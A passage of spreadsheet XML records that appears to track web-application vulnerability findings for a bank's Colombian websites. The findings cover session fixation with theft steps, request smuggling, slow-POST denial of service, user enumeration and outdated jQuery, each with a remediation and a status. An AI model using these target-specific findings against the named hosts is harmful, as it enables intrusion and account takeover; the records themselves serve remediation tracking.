    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="105"/>
    <s v="BSNC"/>
    <s v="BitSight"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <m/>
    <m/>
    <x v="53"/>
    <m/>
    <s v="Solved"/>
    <x v="3"/>
    <m/>
    <m/>
    <m/>
    <s v="www.santander.com.co"/>
    <m/>
    <m/>
    <d v="2020-04-15T00:00:00"/>
    <n v="2260"/>
    <d v="2020-08-13T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2020-12-09T00:00:00"/>
    <s v="Encabezado no configurado"/>
    <s v="El valor recomendado es : no-cache, no-store"/>
    <m/>
    <d v="2020-12-05T00:00:00"/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="106"/>
    <s v="BSNC"/>
    <s v="BitSight"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <m/>
    <m/>
    <x v="54"/>
    <m/>
    <s v="Solved"/>
    <x v="3"/>
    <m/>
    <m/>
    <m/>
    <s v="www.santander.com.co"/>
    <m/>
    <m/>
    <d v="2020-04-15T00:00:00"/>
    <n v="2260"/>
    <d v="2020-08-13T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2020-10-09T00:00:00"/>
    <s v="Encabezado no configurado"/>
    <s v="El valor recomendado es: Default-src ‘self’; font-src *; img-src * data:; script-src *; style-src *;"/>
    <m/>
    <d v="2020-10-15T00:00:00"/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="107"/>
    <s v="BSNC"/>
    <s v="BitSight"/>
    <s v="Wep App"/>
    <s v="A2 20190509_2.3.1.c_CO_20200612_N_07"/>
    <m/>
    <s v="Portal Web"/>
    <m/>
    <m/>
    <x v="55"/>
    <m/>
    <s v="Solved"/>
    <x v="3"/>
    <m/>
    <m/>
    <m/>
    <s v="www.santander.com.co"/>
    <m/>
    <m/>
    <d v="2020-04-15T00:00:00"/>
    <n v="2260"/>
    <d v="2020-08-13T00:00:00"/>
    <x v="0"/>
    <s v="Waiver"/>
    <s v="1ª Fecha: 12/06/2020"/>
    <s v="1ª Fecha: 09/09/2020"/>
    <d v="2020-12-09T00:00:00"/>
    <s v="Actualmente el encabezado tiene configurada 2 veces la directriz “Secure”"/>
    <s v="Es necesario dejar la directriz &quot;Secure&quot; una solo vez, ya que esta duplicada._x000a_Set-Cookie: JSESSIONID=B47D01A6F57E45591F781CC2C34440A2; Path=/; Secure; HttpOnly;Secure."/>
    <m/>
    <d v="2020-12-05T00:00:00"/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="108"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <s v="QA-WAS-1acb63c5-3233-425f-bfc8-96552785b739"/>
    <m/>
    <x v="56"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="www.santander.com.co"/>
    <m/>
    <m/>
    <d v="2020-09-21T00:00:00"/>
    <n v="2101"/>
    <d v="2020-12-20T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="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_x000a__x000a_css/ie.css_x000a__x000a_Referencias:_x000a_Inyección maligna de CSS_x000a_Ataque de sobrescritura de la ruta relativa_x000a_Un trabajo de investigación: Análisis a gran escala de la inyección de estilo por sobreescritura de ruta relativa"/>
    <s v="Se recomienda eliminar las URL relativas y utilizar las URL absolutas en las importaciones de CSS._x000a__x000a_Las siguientes alternativas pueden aplicarse para evitar las vulnerabilidades de PRSSI._x000a_- Establecer un DOCTYPE que no permita el modo Quirks como se explica en https://hsivonen.fi/doctype/_x000a_- Establecer el encabezado de respuesta X-Frame-Opciones:deny_x000a_- Ajustar el encabezado de respuesta X-Content-Type-Opciones: nosniff_x000a_- Definir una etiqueta base HTML para especificar la URL base para todas las URLs relativas de un documento."/>
    <m/>
    <m/>
    <s v="Desestimada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="109"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <s v="QA-WAS-d45bbbd3-f49f-49cb-8479-507eecbe0d00"/>
    <m/>
    <x v="56"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="www.santander.com.co"/>
    <m/>
    <m/>
    <d v="2020-09-21T00:00:00"/>
    <n v="2101"/>
    <d v="2020-12-20T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="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_x000a__x000a_https://www.santander.com.co/index.html_x000a__x000a_Referencias:_x000a_Inyección maligna de CSS_x000a_Ataque de sobre escritura de la ruta relativa_x000a_Un trabajo de investigación: Análisis a gran escala de la inyección de estilo por sobre escritura de ruta relativa"/>
    <s v="Se recomienda eliminar las URL relativas y utilizar las URL absolutas en las importaciones de CSS._x000a__x000a_Las siguientes alternativas pueden aplicarse para evitar las vulnerabilidades de PRSSI._x000a_- Establecer un DOCTYPE que no permita el modo Quirks como se explica en https://hsivonen.fi/doctype/_x000a_- Establecer el encabezado de respuesta X-Frame-Opciones:deny_x000a_- Ajustar el encabezado de respuesta X-Content-Type-Opciones: nosniff_x000a_- Definir una etiqueta base HTML para especificar la URL base para todas las URLs relativas de un documento."/>
    <m/>
    <m/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="110"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <s v="QA-WAS-aba2d8a7-ab19-4b75-89a6-afc7e842a53e"/>
    <m/>
    <x v="56"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="www.santander.com.co"/>
    <m/>
    <m/>
    <d v="2020-09-21T00:00:00"/>
    <n v="2101"/>
    <d v="2020-12-20T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2021-02-23T00:00:00"/>
    <s v="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_x000a__x000a_css/ie.css_x000a__x000a_Referencias:_x000a_Inyección maligna de CSS_x000a_Ataque de sobre escritura de la ruta relativa_x000a_Un trabajo de investigación: Análisis a gran escala de la inyección de estilo por sobre escritura de ruta relativa"/>
    <s v="Se recomienda eliminar las URL relativas y utilizar las URL absolutas en las importaciones de CSS._x000a__x000a_Las siguientes alternativas pueden aplicarse para evitar las vulnerabilidades de PRSSI._x000a_- Establecer un DOCTYPE que no permita el modo Quirks como se explica en https://hsivonen.fi/doctype/_x000a_- Establecer el encabezado de respuesta X-Frame-Opciones:deny_x000a_- Ajustar el encabezado de respuesta X-Content-Type-Opciones: nosniff_x000a_- Definir una etiqueta base HTML para especificar la URL base para todas las URLs relativas de un documento."/>
    <m/>
    <d v="2021-02-18T00:00:00"/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="111"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Supernet"/>
    <s v="QA-WAS-aa2ef8c4-9df0-41fd-a294-deeb44539638"/>
    <m/>
    <x v="56"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F"/>
    <m/>
    <m/>
    <d v="2020-09-21T00:00:00"/>
    <n v="2101"/>
    <d v="2020-12-20T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2022-08-11T00:00:00"/>
    <s v="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_x000a__x000a_App_Themes/Login/Login.css?v=H20150511_1205_x000a_App_Themes/Default/Default.css?v=H20150511_1205_x000a_App_Themes/Common/blockScreen/blockScreen.css?v=H20150615_1800_x000a_App_Themes/Login/Login.css_x000a__x000a_Ruta: https://www.santander.com.co/Web/Login.aspx_x000a__x000a_Referencias:_x000a_Inyección maligna de CSS_x000a_Ataque de sobre escritura de la ruta relativa_x000a_Un trabajo de investigación: Análisis a gran escala de la inyección de estilo por sobre escritura de ruta relativa"/>
    <s v="Se recomienda eliminar las URL relativas y utilizar las URL absolutas en las importaciones de CSS._x000a__x000a_Las siguientes alternativas pueden aplicarse para evitar las vulnerabilidades de PRSSI._x000a_- Establecer un DOCTYPE que no permita el modo Quirks como se explica en https://hsivonen.fi/doctype/_x000a_- Establecer el encabezado de respuesta X-Frame-Opciones:deny_x000a_- Ajustar el encabezado de respuesta X-Content-Type-Opciones: nosniff_x000a_- Definir una etiqueta base HTML para especificar la URL base para todas las URLs relativas de un documento."/>
    <m/>
    <s v="1ª Fecha: 19/08/2021_x000a_2ª Fecha: 26/11/2021_x000a_3ª Fecha: 25/01/2021_x000a_4ª Fecha: 04/02/2022_x000a_5ª Fecha: 04/03/2022"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="112"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="QA-WAS-5509ff08-2bbe-4f1a-8835-20208a01660c"/>
    <m/>
    <x v="57"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="confirming-factoring.santander.com.co"/>
    <m/>
    <m/>
    <d v="2020-09-21T00:00:00"/>
    <n v="2101"/>
    <d v="2020-12-20T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2021-02-15T00:00:00"/>
    <s v="La aplicación web es posiblemente vulnerable a un ataque de denegación de servicio (DoS) &quot;HTTP POST&quot; lento. Se trata de un DoS a nivel de aplicación que consume los recursos del servidor al mantener las conexiones abiertas durante un período de tiempo prolongado enviando lentamente el tráfico al servidor. Si el servidor mantiene demasiadas conexiones abiertas a la vez, entonces puede no ser capaz de responder a nuevas conexiones legítimas. A diferencia de los ataques DoS que consumen ancho de banda, el ataque &quot;lento&quot; no requiere que se envíe una gran cantidad de tráfico al servidor, sólo que el cliente sea capaz de mantener conexiones abiertas durante varios minutos a la vez._x000a__x000a_El ataque mantiene las conexiones del servidor abiertas enviando cabeceras HTTP POST debidamente elaboradas que contienen una cabecera de longitud de contenido con un gran valor para informar al servidor web de la cantidad de datos que puede esperar. Después de que las cabeceras HTTP POST se envían completamente, el cuerpo del mensaje HTTP POST se envía a velocidades lentas para prolongar la finalización de la conexión y bloquear los recursos del servidor. Al esperar el cuerpo completo de la solicitud, el servidor está ayudando a los clientes con conexiones lentas o intermitentes a completar las solicitudes, pero también se está exponiendo al abuso._x000a__x000a_Puede encontrar más información en BlackHat_DC_2011_Brennan_Denial_Service-Slides.pdf."/>
    <s v="La solución sería específica para cada servidor, pero las recomendaciones generales lo son:_x000a_- limitar el tamaño de la solicitud aceptable a los requisitos de cada formulario_x000a_- establecer una tasa de velocidad mínima aceptable_x000a_- establecer un tiempo límite de solicitud absoluto para la conexión con la solicitud POST_x000a_Los detalles específicos del servidor se pueden encontrar aquí. _x000a_Una herramienta que demuestra esta vulnerabilidad de una manera más intrusiva está disponible aquí._x000a_"/>
    <m/>
    <d v="2020-12-06T00:00:00"/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="113"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Supernet"/>
    <s v="QA-WAS-58773e20-1268-4acf-8004-7859031e1be0"/>
    <m/>
    <x v="58"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F"/>
    <m/>
    <m/>
    <d v="2019-09-21T00:00:00"/>
    <n v="2467"/>
    <d v="2019-12-20T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2022-08-11T00:00:00"/>
    <s v="La aplicación web utiliza una o más bibliotecas de JavaScript que contienen una vulnerabilidad conocida._x000a_https://www.santander.com.co/Web/Scripts/jquery-3.4.1.min.js_x000a_jQuery 3.4.1 -&gt; VULNERABLE"/>
    <s v="Por favor, consulte los avisos de seguridad del proveedor relacionados con la versión vulnerable de la biblioteca."/>
    <m/>
    <s v="1ª Fecha: 19/08/2021_x000a_2ª Fecha: 26/11/2021_x000a_3ª Fecha: 25/01/2021_x000a_4ª Fecha: 04/02/2022_x000a_5ª Fecha: 04/03/2022"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="114"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="QA-WAS-e36b3d6f-ac29-4ece-9847-1ce41a552e4d"/>
    <m/>
    <x v="59"/>
    <m/>
    <s v="Solved"/>
    <x v="2"/>
    <m/>
    <m/>
    <m/>
    <s v="confirming-factoring.santander.com.co"/>
    <m/>
    <m/>
    <d v="2020-09-25T00:00:00"/>
    <n v="2097"/>
    <d v="2021-01-23T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2020-10-15T00:00:00"/>
    <s v="Un archivo, directorio o listado de directorio potencialmente sensible fue descubierto en el servidor Web._x000a_Vulnerabilidad reportada por no disponer de un  error genérico, que no dé lugar a conocer si los recursos son, o no, accesibles, pudiendo ocasionar en un mapeo de la página completo conociendo los errores para recursos existentes pero no accesibles desde un usuario externo._x000a_o Ejemplo, recurso legitimo:_x000a_ https://confirming-factoring.santander.com.co/factoring/a4j/g/3_3_3.Final/org/ajax4jsf/admin.php _x000a_o Recurso no legitimo: _x000a_ https://confirming-factoring.santander.com.co/factoring/a4j/g/3_3_3.Final/org/ajax4jsf/Javiadmin.php_x000a_"/>
    <s v="Verifique que el acceso a este archivo o directorio esté permitido. Si es necesario, elimínelo o aplíquele controles de acceso."/>
    <m/>
    <m/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="115"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Supernet"/>
    <s v="QA-WAS-215654f1-cbaa-4a67-af2a-184711b78f68"/>
    <m/>
    <x v="59"/>
    <m/>
    <s v="Solved"/>
    <x v="2"/>
    <m/>
    <m/>
    <m/>
    <s v="www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F"/>
    <m/>
    <m/>
    <d v="2020-09-29T00:00:00"/>
    <n v="2093"/>
    <d v="2021-01-27T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2021-09-28T00:00:00"/>
    <s v="Un archivo, directorio o listado de directorio potencialmente sensible fue descubierto en el servidor Web._x000a_se tratan de recursos accesibles a y con login expuestos._x000a_Redirección de la url: https://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2fWeb%2fApp_Themes%2fLogin%2fWebService%2f"/>
    <s v="Verifique que el acceso a este archivo o directorio esté permitido. Si es necesario, elimínelo o aplíquele controles de acceso._x000a_En esta vulnerabilidad tendrían que confirmar si se tratan de recursos accesibles de forma legítima y si estos paneles de login son públicos y se encuentran en conocimiento de acceso para cualquier persona externa. En caso afirmativo, podríamos dar estos dos casos como falsos positivos, en caso negativo, recomendamos redirigir estas dos URL que aparentemente no son controladas a un error genérico, que, como comentamos, no dé lugar a conocimiento de si son parte, o no, del árbol de directorios de la web."/>
    <m/>
    <d v="2021-08-19T00:00:00"/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="116"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <s v="QA-WAS-1c4c4302-fab0-4350-9c9e-a883e9ce8bd3"/>
    <m/>
    <x v="60"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="www.santander.com.co"/>
    <m/>
    <m/>
    <d v="2020-09-29T00:00:00"/>
    <n v="2093"/>
    <d v="2020-12-28T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2021-03-16T00:00:00"/>
    <s v="La vulnerabilidad de Contrabando de Solicitudes HTTP (HRS) existe cuando hay discrepancias en el análisis de las solicitudes HTTP. _x000a_El flujo de solicitudes HTTP que se origina en un cliente puede ser manejado por diferentes entidades antes de que lleguen al servidor backend. _x000a_Las entidades implicadas pueden ser cualquiera de las siguientes:_x000a_- Proxy HTTP, _x000a_- servidor de caché,_x000a_- equilibrador de carga,_x000a_- servidor web, etc. _x000a_Lógica de detección:_x000a__x000a_Para detectar esta vulnerabilidad estamos manipulando la petición http enviando juntos content_length y transfer_encoding headers."/>
    <s v="Compruebe las entidades HTTP (por ejemplo, el proxy HTTP, el servidor de caché, el equilibrador de carga, el servidor web, etc.) que participan en el flujo de solicitudes http de la aplicación escaneada. _x000a_Una de las entidades HTTP involucradas en su flujo de solicitudes es vulnerable al contrabando de solicitudes HTTP. _x000a_Actualice esa entidad a la última versión o haga los cambios de configuración adecuados para evitar la vulnerabilidad._x000a_"/>
    <m/>
    <m/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="117"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <s v="QA-WAS-549746f5-4621-435a-822c-7d4327b29d44"/>
    <m/>
    <x v="58"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="www.santander.com.co"/>
    <m/>
    <m/>
    <d v="2020-10-07T00:00:00"/>
    <n v="2085"/>
    <d v="2021-01-05T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2020-10-09T00:00:00"/>
    <s v="La aplicación web utiliza una o más bibliotecas de JavaScript que contienen una vulnerabilidad conocida._x000a_https://www.santander.com.co/js/jquery-3.5.1.slim.min.js_x000a_jQuery 3.1.1 -&gt; VULNERABLE"/>
    <s v="Por favor, consulte los avisos de seguridad del proveedor relacionados con la versión vulnerable de la biblioteca."/>
    <m/>
    <d v="2020-10-15T00:00:00"/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="118"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="MAN-22939e24"/>
    <s v="CO-20-CNMPO-007-CO-001"/>
    <x v="61"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="6.5"/>
    <m/>
    <m/>
    <s v="confirming-factoring.santander.com.co"/>
    <m/>
    <m/>
    <d v="2020-11-17T00:00:00"/>
    <n v="2044"/>
    <d v="2021-02-15T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2021-02-08T00:00:00"/>
    <s v="Es posible realizar un robo de sesión aprovechando la fijación de sesión y el envío de IDs de sesión por la URL, para ello se requiere que el usuario abra un enlace con un buscador que no tiene cookies para la aplicación._x000a_Si no hay jsession cookie y se solicita que una página fuerce una redirección, se enviará adicionalmente la cookie de sesión en la url, despues del carácter &quot;;&quot;._x000a_La cookie de sesión no se reinicia al hacer login, de modo que la cookie de sesión enviada en la url sigue estando activa despues del login, identificando y autorizando al usuario_x000a_Esto puede ocasionar un robo de sesión, por ejemplo, en el siguiente escenario:_x000a_• Un atacante envía a la víctima un enlace interno de la aplicación, que fuerza una redirección:_x000a_https://confirming-factoring.santander.com.co/factoring/basico/administrarEntidades/administrarEntidadesList.seam_x000a_• Si la víctima accede al enlace con un buscador que no tiene cookies para el dominio, la web redirigirá al usuario al login creando una nueva sesión y enviándola en la URL, el atacante podría acceder a esta información, por ejemplo, si la víctima está utilizando un proxy o el atacante tiene acceso a su historial._x000a_La víctima inicia sesión, dando acceso a su cuenta al ID de sesión de la cookie que controla el atacante. Del mismo modo el atacante tiene que obtener el valor del parámetro &quot;FACTBOTTKNCSR&quot;, que se envía en la URL una vez autenticado_x000a_• El atacante utiliza la cookie robada y el parámetro FACTBOTTKNCSR para conseguir acceso a su cuenta y obtener o modificar los datos."/>
    <s v="Para eliminar la fijación de sesión se tiene que forzar al servidor o a la aplicación a renovar el ID de sesión cuando el usuario hace login, invalidando la sesión anterior. También se debe solucionar la fuga de información de los IDs de sesión por la URL: • La cookie de sesión JsessionID se muestra en la URL si el servidor recibe una petición que resulta en una redirección. Se deberia forzar al servidor a eliminar ese ID de la URL. • El ID de sesión del parámetro get &quot;FACTBOTTKNCSR&quot; se puede enviar también usando el método POST o en una cabecera de la petición HTTP."/>
    <s v="Un atacante puede engañar a un usuario para que acceda a un enlace mediante este método y robar los datos de la sesión. Obteniendo control de la sesión y teniendo acceso a la aplicación como el usuario legítimo."/>
    <d v="2021-01-23T00:00:00"/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="119"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="MAN-22939e25"/>
    <s v="CO-20-CNMPO-007-CO-002"/>
    <x v="62"/>
    <m/>
    <s v="Solved"/>
    <x v="2"/>
    <n v="3.7"/>
    <m/>
    <m/>
    <s v="confirming-factoring.santander.com.co"/>
    <m/>
    <m/>
    <d v="2020-11-17T00:00:00"/>
    <n v="2044"/>
    <d v="2021-03-17T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2021-02-24T00:00:00"/>
    <s v="Es posible ralentizar el servicio mediante request smuggling, forzando la división de las peticiones en el servidor._x000a_El servicio se puede obstaculizar o denegar utilizando diferentes payloads (endspacex-if, xnprespace-1f, endspacexn-1f...) que dividen las peticiones recibidas por la aplicación o el balanceador de carga e impiden o ralentizan el acceso de otros usuarios._x000a_"/>
    <s v="La solución a esta vulnerabilidad no es trivial, ya que depende de la infraestructura interna y de cómo se están interpretando las peticiones, las siguientes soluciones se pueden tener en cuenta: _x000a_• Deshabilitar las optimizaciones que permitan esta vulnerabilidad. _x000a_• Añadir un Firewall de aplicación (WAF) o un filtro previo a la aplicación que filtre estos payloads."/>
    <s v="Un atacante puede bloquear el acceso a la aplicación a uno o múltiples usuarios durante un tiempo indefinido."/>
    <d v="2021-02-17T00:00:00"/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="120"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="MAN-22939e27"/>
    <s v="CO-20-CNMPO-007-CO-003"/>
    <x v="63"/>
    <m/>
    <s v="Solved"/>
    <x v="2"/>
    <n v="3.7"/>
    <m/>
    <m/>
    <s v="confirming-factoring.santander.com.co"/>
    <m/>
    <m/>
    <d v="2020-11-17T00:00:00"/>
    <n v="2044"/>
    <d v="2021-03-17T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2021-02-08T00:00:00"/>
    <s v="La aplicación confía en la cabecera de Host de la petición recibida, pudiendo ser modificada por el_x000a_usuario._x000a_La aplicación confía en la cabecera de Host de la petición recibida, pudiendo ser modificada por el_x000a_usuario. Este dato puede ser utilizado para redirigir al usuario a un dominio no controlado por la_x000a_entidad, para construir enlaces o para generar peticiones internas, que pasarían a ser controladas_x000a_por el usuario._x000a_Este dato se puede obtener internamente sin tener que confiar en el dato recibido en la petición._x000a_"/>
    <s v="El valor del Host debe obtenerse internamente en la aplicación, sin tener que confiar en una cabecera que puede ser modificada."/>
    <s v="En este caso sólo se ha conseguido redirigir a el usuario al dominio indicado en la cabecera enviada, pero podría provocar más vulnerabilidades si se utiliza ese valor en otras funcionalidades, por ejemplo si se usa para construir URLs en el proceso de recuperación de contraseña."/>
    <d v="2021-01-23T00:00:00"/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="121"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Supernet"/>
    <s v="MAN-e70f8b9f"/>
    <s v="SCO-20-CNMPO-06-AP-001"/>
    <x v="64"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="5.3"/>
    <m/>
    <m/>
    <s v="www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F"/>
    <m/>
    <m/>
    <d v="2020-11-11T00:00:00"/>
    <n v="2050"/>
    <d v="2021-02-09T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2022-08-11T00:00:00"/>
    <s v="Es posible obtener los usuarios registrados en la aplicación web en base a los diferentes errores que muestra el aplicativo. Estos errores son diferentes en función de si el usuario introducido es válido o no._x000a_Se pueden obtener estos usuarios en la funcionalidad de login y de recuperación de contraseña.En caso de existir el usuario: la aplicación avanza, enseñando un formulario pidiendo la contraseña o la pregunta de seguridadEn  caso  de  no  existir  el  usuario:  la  aplicación  devuelve  la  misma  página,  añadiendo  el  texto  &quot;La operación no puede ser realizada&quot;"/>
    <s v="Se recomienda modificar los mensajes de error presentados al usuario para que no proporcionen información sobre la existencia del usuario. Un posible mensaje podría ser &quot;El usuario y/o la contraseña introducidos no son válidos&quot; tanto para usuarios incorrectos como para contraseñas incorrectas."/>
    <s v="Un atacante puede obtener un listado de los usuarios de la aplicación con el objetivo de utilizar dicha información para planificar y generar ataques de mayor impacto. Como por ejemplo ataques de fuerza bruta sobre usuarios existentes para descubrir las contraseñas o ataques de password spraying."/>
    <s v="1ª Fecha: 19/08/2021_x000a_2ª Fecha: 26/11/2021_x000a_3ª Fecha: 25/01/2021_x000a_4ª Fecha: 04/02/2022_x000a_5ª Fecha: 04/03/2022"/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="122"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="QA-WAS-4463c8bb-1185-4832-a52c-17875685cd01"/>
    <m/>
    <x v="65"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="confirming-factoring.santander.com.co"/>
    <m/>
    <m/>
    <d v="2020-11-18T00:00:00"/>
    <n v="2043"/>
    <d v="2021-02-16T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2020-11-19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ALLOW-FROM incluyendo CHROMO y SAFARI._x000a_Para más información, véase https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet._x000a_Para errores más comunes de implementación de X-FRAME-OPTION, por favor visite el siguiente enlace: _x000a_https://blog.qualys.com/securitylabs/2015/10/20/clickjacking-a-common-implementation-mistake-that-can-put-your-websites-in-danger_x000a__x000a_Traducción realizada con la versión gratuita del traductor www.DeepL.com/Translator"/>
    <m/>
    <m/>
    <s v="Falso positivo"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="123"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="QA-WAS-515ad7f7-02c9-4ea1-b291-eef08e19230a"/>
    <m/>
    <x v="65"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="confirming-factoring.santander.com.co"/>
    <m/>
    <m/>
    <d v="2020-11-18T00:00:00"/>
    <n v="2043"/>
    <d v="2021-02-16T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2020-11-19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ALLOW-FROM incluyendo CHROMO y SAFARI._x000a_Para más información, véase https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet._x000a_Para errores más comunes de implementación de X-FRAME-OPTION, por favor visite el siguiente enlace: _x000a_https://blog.qualys.com/securitylabs/2015/10/20/clickjacking-a-common-implementation-mistake-that-can-put-your-websites-in-danger_x000a__x000a_Traducción realizada con la versión gratuita del traductor www.DeepL.com/Translator"/>
    <m/>
    <m/>
    <s v="Falso positivo"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="124"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="QA-WAS-c7549ecb-adf6-4ef5-a7fd-0712159cfffa"/>
    <m/>
    <x v="65"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="confirming-factoring.santander.com.co"/>
    <m/>
    <m/>
    <d v="2020-11-18T00:00:00"/>
    <n v="2043"/>
    <d v="2021-02-16T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
